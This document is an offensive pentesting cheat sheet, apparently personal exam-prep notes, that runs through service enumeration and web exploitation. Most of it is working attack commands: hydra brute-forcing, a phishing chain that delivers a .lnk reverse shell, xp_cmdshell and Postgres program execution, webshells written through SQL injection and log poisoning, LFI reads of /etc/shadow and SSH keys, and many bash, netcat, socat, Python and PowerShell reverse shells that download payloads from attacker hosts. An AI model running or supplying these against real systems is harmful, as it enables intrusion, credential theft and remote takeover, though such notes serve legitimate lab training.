# Services

## Enumerate Services
AutoRecon:

```
sudo $(which autorecon) <ip>
```

Nmap:
```
#TCP
sudo nmap -p- -A <ip> -oN tcp_scan.txt -T4

#UDP
sudo nmap -p- -sU <ip> -oN udp_scan.txt -T4
sudo nmap --top-ports 1000 -A -sU <ip> -oN udp_scan.txt -T4
```

Others
Linux:
```
sudo nmap -sn -PS22,80,443,445,3389,5895,47001 172.16.1.0/24

for ip in $(seq 1 254); do
  (timeout 1 bash -c "</dev/tcp/172.16.1.$ip/445" && echo "172.16.1.$ip is up") 2>/dev/null
done

for ip in $(seq 1 254); do
  for port in 22 80 443 445 3389; do
    (echo >/dev/tcp/172.16.2.$ip/$port) >/dev/null 2>&1 && \
    echo "Host 172.16.2.$ip has port $port open" && break
  done
done
```

Windows:
```
1..254 | ForEach-Object {
    $ip = "172.16.2.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        Write-Host "$ip is alive"
    }
}

$ports = 445,135,3389
1..254 | ForEach-Object {
    $ip = "172.16.2.$_"
    foreach ($port in $ports) {
        $result = Test-NetConnection -ComputerName $ip -Port $port -WarningAction SilentlyContinue
        if ($result.TcpTestSucceeded) {
            Write-Host "$ip is alive (port $port open)"
            break
        }
    }
}
```


## FTP

Complete scan:
```
nmap --script=ftp-* -p 21 $ip
```

Anonymous Login:
```
ftp -aA4 {IPv4}
```

Download all files:
```
wget -m ftp://anonymous:anonymous@10.10.10.98
mget *
```

After download files always use:

```
exiftool –u -a <filename>
```

Bruteforce Default Credentials:
```
hydra -V -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 192.168.157.46 ftp
```

Get user running:
```
user
```

If dir or ls do not work:

```
passive
```

Other modes:

```
binary #Set transmission to binary instead of ascii
ascii #Set transmission to ascii instead of binary
```

Put file (check if you can access it on the website):
💡 In FTP, binaries in ASCII mode will make the file not executable. Set the mode to `binary`.

```js
echo "test" > test.txt
put test.txt
put ~/Desktop/share/php/html-php-backdoor.php html-php-backdoor.php
```

Search for version online for vulnerabilities:

- FTP version above 3.0 not exploitable

## SSH
Audit:
```
ssh-audit <ip>
```

Bruteforce:
```
hydra -l sunny -P /usr/share/wordlists/rockyou.txt 10.129.30.17 ssh -s 22022

hydra -L users-ssh.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.238.122 -V -u -f -o valid-ssh-creds.txt
```

Login:

```
chmod 600 id_rsa
ssh -i id_rsa -p 2222 noman@ip
ssh noman@ip
```

Files:
- LFI SSH Key wordlist https://github.com/PinoyWH1Z/SSH-Private-Key-Looting-Wordlists?utm_source=chatgpt.com

Sometimes you can get additional information related to the key under: `/etc/ssh/ssh_config` / `/etc/ssh/sshd_config` / `/home/user/.ssh/authorized_keys`
```
/home/<user>/.ssh/authorized_keys
/home/<user>/.ssh/id_rsa
```

Upload id_rsa.pub to target:
```
ssh-keygen # create id_rsa & id_rsa.pub (DONE! ~/.ssh/id_rsa & ~/Desktop/share/authorized_keys)

#Upload content of id_rsa.pub to target's authorized_keys

ssh -i ~/.ssh/id_rsa remi@192.168.191.231
```

## SMTP (25)

Full enumeration:

```
nmap 192.168.10.10 --script=smtp* -p 25
```

You can send phishing email with this port to get reverse shell:
Execution Steps

1. Create a Windows library file connecting to a _WebDAV_[1](https://portal.offsec.com/courses/pen-200-44065/learning/client-side-attacks-48976/abusing-windows-library-files-49009/obtaining-code-execution-via-windows-library-files-48979#fn-local_id_97-1) share we'll set up.
    
    1. Windows Library File (share.Library-ms)
    
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <libraryDescription xmlns="<http://schemas.microsoft.com/windows/2009/library>">
    <name>@windows.storage.dll,-34582</name>
    <version>6</version>
    <isLibraryPinned>true</isLibraryPinned>
    <iconReference>imageres.dll,-1003</iconReference>
    <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
    </templateInfo>
    <searchConnectorDescriptionList>
    <searchConnectorDescription>
    <isDefaultSaveLocation>true</isDefaultSaveLocation>
    <isSupported>false</isSupported>
    <simpleLocation>
    <url><http://192.168.45.216></url>
    </simpleLocation>
    </searchConnectorDescription>
    </searchConnectorDescriptionList>
    </libraryDescription>
    ```
    
    2. Setup WebDav share:
    
    ```bash
    pipx install wsgidav
    pipx install cheroot / pip install cheroot --break-system-packages
    pipx inject wsgidav cheroot
    mkdir /home/kali/webdav
    touch /home/kali/webdav/test.txt
    wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/nabecos/webdav/
    ```
    
2. We'll provide a payload in the form of a **.lnk** shortcut file for the second stage to execute a PowerShell reverse shell. We must convince the user to double-click our **.lnk** payload file to execute it. Create a body.txt file with some body content.
    

```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('<http://192.168.119.3:8000/powercat.ps1>');powercat -c 192.168.119.3 -p 4444 -e powershell"
```

5. Send email (We must have valid credentials to send an email)

```
sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server <target-smtp> --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```

Bruteforce:

```
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V
```

Username Bruteforce
Automatic Tool: `smtp-user-enum`

**RCPT TO**
```
telnet <ip> 25

HELO x

MAIL FROM: example@domain.com
RCPT TO:test
RCPT TO:admin
RCPT TO:root
```

**VRFY**
```
telnet <ip> 25

HELO x

VRFY root
```

**EXPN**
```
telnet <ip> 25

HELO x

EXPN root
```

## DNS

```
dig @192.168.162.122 AXFR hutch.offsec
nslookup <ip>
dig <ip>
host <ip>
host -t ns $ip
dnsenum
```

## LDAP

Enumeration:
```
nmap -n -sV --script "ldap* and not brute" <IP>
```

Anonymous Bind:

```
dapsearch -x -H ldap://10.211.11.10 -s base #Check if we can ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(objectClass=person)" #Query Users ldapsearch -x -H ldap://10.211.11.10 -b "dc=tryhackme,dc=loc" "(sAMAccountName=rduke)" #Query User

nxc ldap 10.211.11.10 -d tryhackme.loc -u '' -p '' --users 2>/dev/null | awk '{print $5}' > users.txt 
nxc ldap 10.211.11.10 -d tryhackme.loc -u '' -p '' --users 
nxc ldap 10.211.11.10 -d tryhackme.loc -u '' -p '' --active-users 
nxc ldap 10.211.11.10 -d tryhackme.loc -u '' -p '' --query "(sAMAccountName=rduke)" ""

ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>" > ldap_search.txt
cat ldap_search.txt | grep -i "samaccountname" | cut -d: -f2 | tr -d " " > users.txt
```

## RPC

```
rpcclient -U '%' -N 192.168.162.122
rpcclient 192.168.162.122 -N

rpcclient -W '' -c querydispinfo -U''%'' '192.168.181.175'

# Authenticated
enumdomusers
queryuser 1634 #RID
enumdomgroups
getdompwinfo # Password Policy
queryusergroups 0x46c
setuserinfo christopher.lewis 23 'Admin!23' #Change Pass
```

## SMB

Common Vulnerabilities
```
nmap -v -script smb-vuln* -p 139,445 10.10.10.10
```

```
enum4linux-ng -A 192.168.10.10

netexec smb <ip> -u '' -p '' --shares

netexec smb <ip> -u '' -p '' --rid-brute 10000
netexec smb <ip> -u 'Guest' -p '' --rid-brute 10000

netexec smb <ip> -u 'Guest' -p '' --shares
```

List and Access:

```
smbclient -p 4455 -L //192.168.10.10/ -U noman --password=noman1234

smbclient -p 4455 //192.168.10.10/scripts -U noman --password noman1234
```

## RDP

Bruteforce
```
hydra -t 4 -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip
```

Login:

```
xfreerdp3 /v:noman /u:passwordnoman /p:192.168.10.10 /clipboard +dynamic-resolution /sec: rdp
xfreerdp3 /u:CONTOSO\JohnDoe /p:Pwd123! /v:rdp.contoso.com
xfreerdp3 /u:JohnDoe /p:Pwd123! /w:1366 /h:768 /v:192.168.1.100:4489
```

Alternatives to xfreerdp3 (if you encounter errors):

```
remmina
```

## Postgres

Try some credentials:

```
psql -U root -h 192.168.237.143 -p 5432
```

Bruteforce (Try Default Credentials by hand since this did not work):
```
ncrack -v -U users.txt -P passwords.txt psql://192.168.211.47:5437 
```


```
psql -h 172.22.0.1 -U postgres -p 5432

\l
\c <database>
\dt
SELECT * FROM users;
```

**Interesting Groups**

- If you are a member of **`pg_execute_server_program`** you can **execute** programs
- If you are a member of **`pg_read_server_files`** you can **read** files
- If you are a member of **`pg_write_server_files`** you can **write** files

Get User role `\du`

Other data:

```
select version();
show databases;
use databse
select * from users;
show tables
select system_user();
SELECT user, authentication_string FROM mysql.user WHERE user = Pre
```

Check online because there are ways to execute commands in PostGres (https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html):

```
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

# Reverse shell
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f';
```

## MySQL

Enumeration:
```
nmap -n -v -sV -Pn -p 1433 –script ms-sql-info,ms-sql-ntlm-info,ms-sql-empty-password $ip
```

Bruteforce
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt 192.168.146.186 mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```

Inspect:

```
show databases;
use x;
show tables;
select * from users;

SELECT @@version;
SELECT name FROM sys.databases; 
SELECT _FROM offsec.information_schema.tables;
select_ from offsec.dbo.users;
```

## MSSQL
Login:

```
impacket-mssqlclient noman:'Noman@321@1!'@192.168.10.10
impacket-mssqlclient Administrator: 'Noman@321@1!'@192.168.10.10 -windows-auth
```

Enumeration:

```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]
```

RCE:
```
### Connect as CMD database

EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXEC xp_cmdshell 'whoami';
exec xp_cmdshell 'cmd /c powershell -c "curl 192.168.10.10/nc.exe -o \windows\temp\nc.exe"';
exec xp_cmdshell 'cmd /c dir \windows\temp';
exec xp_cmdshell 'cmd /c "\windows\temp\nc.exe 192.168.10.10 443 -e cmd"';

EXECUTE xp_cmdshell 'powershell iwr -uri http://10.10.137.147:8888/nc64.exe -OutFile C:/Users/Public/nc64.exe';
EXECUTE xp_cmdshell 'C:/Users/Public/nc64.exe 10.10.137.147 443 -e cmd';

also applied on SQL Injection login
```

## WinRM

```
evil-winrm -i 172.16.1.5 -u sophie -p 'Alltheleavesarebrown1'
evil-winrm -i 172.16.1.5 -u sophie -H '2384undfeufu230'
```

## SNMP

Enumeration:

```
sudo nmap -sU -p161 --script *snmp* 192.168.240.42
```

Check for access:

```
echo public > community
echo private >> community
echo manager >> community
#List of IPs
onesixtyone -c community -i ips
```

Best way to bruteforce (tries a bunch of default string with v1, v2c and v3):
```
python snmpbrute.py -t 10.129.228.102 -p 161
```
JUST ENUMERATION IT USES MSFCONSOLE FOR OTHER CHECK!!!

Query SNMP:
```
snmp-check 192.168.240.42

snmpwalk -c public -v1 -t 10 192.168.50.151
snmpwalk -v1 -c public 192.168.189.156 1.3.6.1.4.1.8072.1.3.2.3.1.1
```

No argument enumerates the entire MIB tree

```bash
snmpwalk -c public -v1 -t 10 192.168.50.151
```

Specific argument enumerate specific portions of the MIB Tree such as the Windows users, processes, installed softawre and open TCP ports:

```bash
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.25.6.3.1.2
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.2.1.6.13.1.3
```

Extract information (snmpbulkwalk quicker output and Oqv is a filter to better parse the output):
```
snmpwalk -c public -v1 -t 10 192.168.50.151
snmpbulkwalk -c internal -v2c -t 10 -Oqv mentorquotes.htb
```


Other usefull commands:

```
snmpwalk -v 1 -c public 192.168.10.10 NET-SNMP-EXTEND-MIB::nsExtendOutputFull 

snmpwalk -v1 -c public 192.168.167.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
#(this is command I have used in 2 3 machine to find username, password, or hint of user and pass
```

## SSL
- Analyze the HTTPS certificate
```
openssl s_client -connect $ip:443
```

## NFS

Enumeration:
```bash
showmount -e <IP>
nmap -p 2049 --script=nfs-* <ip>
```

Mounting:

```
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock


mkdir /mnt/new_back
mount -t nfs [-o vers=2] 10.12.0.150:/backup /mnt/new_back -o nolock
```

https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html

Read files to check for confidential data inside:
```
ls -la /mnt/nfs/
```

Same as FTP or SMB, try to upload files to access using Web to try and get a web shell:

```
cp shell.php /mnt/nfs/
ls -lah /mnt/nfs/
```

## Other voodoo unknown ports
- HackTricks

```
nc -nv 192.168.217.143 3003
help
version
```


# Web Application

Automatic:

```
nikto -h $ip
nikto -h $ip -p 80,8080,1234
```

Add to /etc/hosts

## 403

Bypass 403 with `X-Forwarded-For: 127.0.0.1` or target's IP

## Directory/Subdomain Bruteforcing

Best Wordlists:
- Seclist: directory list 2-3big.txt and raft wordlist

Gobuster

```
gobuster dir -u http://UnDerPass.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
-x php

gobuster vhost -u http://srv22.oscp.exam:8080/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

Ffuf:

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.devvortext.htb" -u http://devvortex.htb
```

Feroxbuster

```
feroxbuster -u http://cozyhosting.htb -A -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -E -B
```

Crawl potential paths inside a list of URLs:

```
ffuf -u http://openadmin.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,204,301,302,307,401 -o results.txt
python3 ~/Desktop/binaries/web/crawl.py results.txt
```

Git-Dumper
```
git-dumper http://bitforge.lab/.git/
```


## Common Software

Wordpress


```
wpscan --url http://10.10.110.100:65000/wordpress --api-token <api-token> -e ap,at,tt,cb,dbe,u,m --plugins-detection aggressive


wpscan --url example.com -e u --passwords /usr/share/wordlists/rockyou.txt

wpscan --url [example.com](http://example.com) -U admin -P /usr/share/wordlists/rockyou.txt
```


- Code Execution on Authenticated:
	- Edit 404.php or another one
	- Upload Malicious Plugin

Drupal

- droopescan scan drupal -u [http://example.org/](http://example.org/) -t 32
- find version > /CHANGELOG.txt

Adobe Cold Fusion

- check version /CFIDE/adminapi/base.cfc?wsdl
- fckeditor Version 8  LFI > [http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en](invalid://)

Elastix

- Google the vulnerabilities
- default login are admin:admin at /vtigercrm/
- able to upload shell in profile-photo

Joomla

- Admin page - /administrator
- Configuration files configuration.php | diagnostics.php | [joomla.inc](http://joomla.inc).php | [config.inc](http://config.inc).php

Mambo

- Config files >> configuration.php | [config.inc](http://config.inc).php

Tomcat

## Login Page

1. Try common credentials such as admin/admin, admin/password and user/user.
2. Use default credentials.
3. Determine if you can enumerate usernames based on a verbose error message.
4. Manually test for SQL injection.
5. View Source Code
6. If all fails, run hydra to brute force credentials.
7. Register User
8. Inspect session cookie

## File Upload
Hacktricks
- Change mime type
- Extension bypass (null byte, double extension, similar extension etc...)
- Add image headers
- Magic Bytes
- Add payload in exiftool comment and name file as file.php.png
	- ExifTool 1. <?php system($_GET['cmd']); ?> //shell.php 2. exiftool "-comment<=shell.php" malicious.png 3. strings malicious.png | grep system

After uploading a file try to perform a fuzzing attack using (if you have not discovered the file upload folder or get a 403):
```
ffuf -w wordlist -u https://ip/FUZZ/shell.php 
```

## SSRF

Request asking for URL input 
- http://kali/file.txt -> Check if our http server gets this request
- http://127.0.0.1
- FFUF 127.0.0.1:FUZZ all ports to find an API or something else

## Command Injection
- Try different characters to check for verbose error messages

Blind ICMP:
```
test.txt;<command>;

sudo tcpdump -i tun0 icmp -n -v
test.txt;ping -c 1 10.10.16.33; #Linux
test.txt;ping -n 1 10.10.16.33; #Windows

test.txt;sleep 10;
```

Blind HTTP (Check Port Connectivity):
```
python -m http.server 80
wget http://attackerip/test
curl http://attackerip/test
```
Cheat sheet with commands to try:
https://github.com/payloadbox/command-injection-payload-list

1. Run one liner reverse shell
2. Upload binary, give execute permissions and run
3. Create .ssh folder and upload public key (only works if user running is not a service)

## LFI

1. Log Poisoning
2. Get Confidential Information
3. Escalate to RFI

Discovery:
https://github.com/rowbot1/lfi.list/blob/master/list.list
FFUF or Intruder:
```
ffuf -request ../attendance.req --request-proto http -w command.txt -t 50 -x http://127.0.0.1:8080 -enc FUZZ:urlencode
```

### Confidential Data

etc/passwd
ssh files

https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/etc/group
/etc/hostname
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/httpd/error_log
/var/log/messages
/var/log/cron.log
/var/log/auth.log
/var/www/html/wp-config.php
/var/www/configuration.php
/var/www/html/inc/header.inc.php
/var/www/html/sites/default/settings.php
/var/www/configuration.php
/var/www/config.php
```


https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows
```
C:\Windows\system32\drivers\etc\hosts
C:/Windows/system32/drivers/etc/hosts
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
C:/Windows/Panther/Unattend/Unattended.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:/Windows/Panther/Unattended.xml
C:\Windows\Panther\Unattended.xml
C:/Windows/Panther/Unattend.txt
C:\Windows\Panther\Unattend.txt
C:/Unattend.txt
C:\Unattend.txt
C:/Autounattend.txt
C:\Autounattend.txt
C:/Windows/system32/sysprep
C:/Windows/System32/sysprep
C:\Windows\system32\sysprep
C:\Windows\System32\sysprep
C:/inetpub/wwwroot
C:\inetpub\wwwroot
C:/inetpub/wwwroot/web.config
C:\inetpub\wwwroot\web.config
C:/inetpub/logs/logfiles
C:\inetpub\logs\logfiles
```

1. Try to find SSH keys for each user (Search all types of keys in SSH Repo above)
2. Search for Web Configuration files (config.php, wp-config.php) related to the software in use: **IMPORTANT NOTE:** If you find a valid file but are getting not output (based on different error messages) because the extension makes is that the file is parsed as code (ex:config.php) you can use PHP Wrappers to base64 encode the file contents: 
```
/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../etc/passwd

/nav.php?page=php://filter/convert.base64-encode/resource=../../../../../../var/www/html/wordpress/wp-config.php
```
3. Check hacktricks

#### Log Poisoning
https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/logs-poisoning
Check access logs:
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/nginx/access.log
/var/log/auth.log # SSH
/var/log/svftpd.log # FTP
/var/log/mail.log # Mail
/proc/self/environ
```

Insert Malicious PHP code:

```
http://10.10.0.18/download.php?fid=<?php system(\$_GET['cmd']); ?>
http://10.10.0.18/download.php?fid=../../../../var/log/nginx/access.log&cmd=whoami
```

Attention to usage of &!!!

Check Log again and see if code is executed:

```
../../../../../var/log/nginx/access.log
```



## RFI

Try to get RFI, by serving a reverse shell and calling it:

```
python -n http.server 81
nc -lnvp 80
/site/index.php?page=http://192.168.45.172:81/new_php_rev.php
```

Also try this on fields that receive URLs like in the SSRF case!!!

If you upload a webshell the receives an argument try both:

```
new_php_rev.php?cmd=whoami
new_php_rev.php&cmd=whoami
```

## SQLi

1. Try to list database contents
2. Try to Read Files (/etc/passwd and SSH Private Keys) and PayloadAllTheThings for other LFI interesting files
3. Function LOAD_FILE (`' UNION SELECT LOAD_FILE('/etc/passwd')-- -)
4. Write Files
5. Execute commands
6. Write Files (Upload webshell to accessible folder path)
```
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php' 

' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'

#Alternative Function
into dumpfile
```

Try to use responder to get NTML Hash in windows:
```
responder
\\attackerip\sharename\
```

💡 We can find webshell location to upload in phpinfo (.php) DOCUMENT_ROOT or just by guessing.

If you suspect specific parameters you can use: https://github.com/payloadbox/sql-injection-payload-list/tree/master/Intruder/detect

### MySQL
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md
#### Based Select

Number of Columns
```
/room.php?cod=3+ORDER+BY+7;--

/room.php?cod=3+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL,NULL;--
```

Get MySQL Version
```
/room.php?cod=33+UNION+SELECT+NULL,@@version,NULL,NULL,NULL,NULL,NULL;--
```

Database and User:

```
database()
user()
```

Iterate table names or limit to tables which are not default:
```
/room.php?
cod=33+UNION+SELECT+NULL,TABLE_NAME,NULL,NULL,NULL,NULL,NULL+from+information_schema.tables+limit+1+OFFSET+160;--

/room.php?
cod=33+UNION+SELECT+NULL,TABLE_NAME,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables+WHERE+table_schema+NOT+IN+('information_schema',+'mysql',+'performance_schema',+'sys')+limit+1+offset+0
```

Get Databases
```
/room.php?cod=33+UNION+SELECT+NULL,TABLE_SCHEMA,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables+limit+1+offset+0

/room.php?cod=33+UNION+SELECT+NULL,TABLE_SCHEMA,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables+where+table_name="room"
```

Get Table Columns
```
/room.php?cod=33+UNION+SELECT+NULL,COLUMN_NAME,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.columns+where+table_schema="hotel"+AND+table_name="room"
```

Read File:
```
/room.php?cod=33+UNION+SELECT+NULL,load_file("/etc/passwd"),NULL,NULL,NULL,NULL,NULL
```

Write File and where to write (read configuration file):
```
/room.php?cod=33+UNION+SELECT+NULL,load_file("/etc/apache2/sites-available/000-default.conf"),NULL,NULL,NULL,NULL,NULL

/room.php?cod=3+UNION+SELECT+NULL,"test",NULL,NULL,NULL,NULL,NULL+into+outfile+'/var/www/html/images/1.txt'

/room.php?cod=33+UNION+SELECT+NULL,load_file("/etc/passwd"),NULL,NULL,NULL,NULL,NULL+into+outfile+'/var/www/html/images/3.txt'
```

File Upload to RCE:

```
/room.php?cod=33+UNION+SELECT+NULL,"<?=`$_GET[0]`?>",NULL,NULL,NULL,NULL,NULL+into+outfile+"/var/www/html/images/rev.php"
```


# Reverse Shell

https://www.revshells.com/

Check connectivity:
```
sudo tcpdump -i tun0 icmp -v -n
ping -c 5 192.168.45.226
```

## Upgrade Shell

```
which python / which python3

python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty -a
stty raw -echo; fg
stty rows 60 cols 111
export TERM=xterm
reset
```

## Linux

```
bash -c "bash -i >& /dev/tcp/192.168.45.197/443 0>&1"
nc 192.168.45.239 4444 -e /bin/bash

<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.213/443 0>&1'");
?>

wget 192.168.45.194/payload/bash-shell -O /tmp/shell
chmod +x /tmp/shell
/tmp/shell

busybox nc 192.168.45.218 443 -e sh

#Needs netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.160 443 >/tmp/f

# Full TTY reverse shell
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Encrypted reverse shell
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```


## Powershell

One Liners:
```
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $st
ream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ('. {' + $data + '} *>&1') | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe%20-enc%20<base64 encoded payload>
```

```
powershell $client = New-Object System.Net.Sockets.TCPClient("192.168.45.205",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Powercat:

```
powershell -c "& {iex (Get-Content 'C:\Windows\Temp\powercat.ps1' -Raw); powercat -c 192.168.45.216 -p 14080 -e c:\windows\system32\cmd.exe}"

#or

powershell -c "iex (Get-Content 'C:\Windows\Temp\powercat.ps1' -Raw); powercat -c 192.168.45.216 -p 14080 -e c:\windows\system32\cmd.exe"

#or

powershell IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.191/powercat.ps1');powercat -c 192.168.45.191 -p 443 -e powershell

#or

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.168/powercat.ps1'); powercat -c 192.168.45.168 -p 443 -e cmd.exe
#or
cmd /c "powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.197/powercat.ps1'); powercat -c 192.168.45.197 -p 443 -e cmd.exe"
```

MSFVenom:

```
//32 bit
msfvenom -p windows/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.3 LPORT=443

//64 bit
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o shell.exe LHOST=192.168.45.3 LPORT=443

//download + execute (2 stage)
certutil -urlcache -split -f http://192.168.45.3/shell.exe C:/Windows/Temp/shell.exe
C:/Windows/Temp/shell.exe
```

Invoke-PowershellTCP:

```
# Download and execute directly
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"
```

ConPtyShell:
https://github.com/antonioCoco/ConPtyShell
```
stty raw -echo; (stty size; cat) | nc -lvnp 3001

. .\ConPtyShell.ps1
Invoke-ConPtyShell 192.168.49.98 80
```

SMB Sharing+ CMD reverse shell (use when other payloads don’t work)
```
python /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support share ~/Desktop/binaries/windows/shells

cmd /c //192.168.45.213/share/nc64.exe -e cmd.exe 192.168.45.213 4444
```

# Remote Command Execution

## Linux

1. Check Utilities (nc,ncat,base64,bash,sh,wget)
2. One liner (/bin/bash -c '') or netcat (rev or bind)
3. Base64 One liner
4. Upload file, chmod, execute

# Utilities Commands

SOCAT:
Reverse Shell
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.16.18:4444
```

### Transfer Files
https://raw.githubusercontent.com/eMVee-NL/MindMap/refs/heads/main/image/Mindmap%20transfer%20files%20to%20ATTACKER.png
####  Linux -> Kali
FTP 

```
python3 -m pyftpdlib -w -p 21 -u nabecos -P 123 #On Kali
ftp 10.10.16.18
mput tickets.db
```


Transfer File Netcat

```
nc -lnvp 9001 > test.txt
cat test.txt > /dev/tcp/10.10.16.33/9001
```

Scp
```
scp julian@172.16.2.101:/usr/sbin/readfile .
```

#### Kali -> Windows

```
